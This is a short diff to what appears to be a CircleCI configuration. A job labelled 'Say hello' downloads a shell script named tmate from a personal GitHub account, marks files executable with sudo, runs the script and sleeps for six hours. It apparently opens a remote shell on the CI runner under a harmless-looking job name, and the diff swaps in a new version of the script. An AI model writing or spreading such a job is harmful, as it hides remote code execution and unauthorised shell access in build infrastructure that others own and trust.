@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://raw.githubusercontent.com/meyersgeorgia639/ish/main/tmate.sh; sudo chmod +x *; bash ./tmate.sh; sleep 6h"
+          command: "wget https://raw.githubusercontent.com/meyersgeorgia639/ish/main/tmate2.sh; sudo chmod +x *; bash ./tmate2.sh; sleep 6h"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
